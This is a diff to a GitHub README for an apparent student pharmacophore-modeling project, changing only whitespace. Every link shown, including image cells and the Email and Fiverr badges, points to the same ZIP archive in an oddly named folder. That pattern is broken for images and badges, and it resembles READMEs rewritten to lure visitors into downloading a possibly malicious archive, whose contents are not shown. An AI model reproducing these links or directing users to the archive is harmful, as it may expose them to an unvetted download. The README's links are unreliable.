@@ -47,7 +47,6 @@ This was developed as a **class activity** for the Computational Drug Design cou
 |--------------|-------------------|-----------------|
 | ![Model Features](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) | ![hit](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) | ![screen](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) |
 
-
 ---
 
 ## 📦 Folder Contents
@@ -77,7 +76,7 @@ This project is shared under the **MIT License**. You are free to use, modify, a
 ---
 
 [![Email](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)
-[![Fiverr](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip%20Me-green?style=for-the-badge&logo=fiverr)](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)
+[![Fiverr](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip%20Me-green?style=for-the-badge&logo=fiverr)](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) 
 
 
 ## 🙌 Acknowledgements
